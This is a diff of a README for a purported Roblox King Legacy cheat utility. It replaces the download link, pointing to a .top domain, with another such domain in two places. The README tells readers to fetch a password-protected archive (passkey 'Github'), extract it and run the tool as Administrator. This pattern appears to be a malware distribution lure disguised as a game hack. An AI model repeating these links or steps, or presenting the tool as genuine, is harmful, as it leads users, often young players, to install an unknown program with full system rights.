@@ -6,7 +6,7 @@ King Legacy utility with auto-farm, fruit spawner, unlock all fruits, auto-raid,
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -77,7 +77,7 @@ This tool automates farming, fruit spawning, unlocking, and stat hacking to enha
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top)** to download.
 2. Extract the archive.
 3. Launch Roblox and join King Legacy.
 4. Run the tool **as Administrator**.
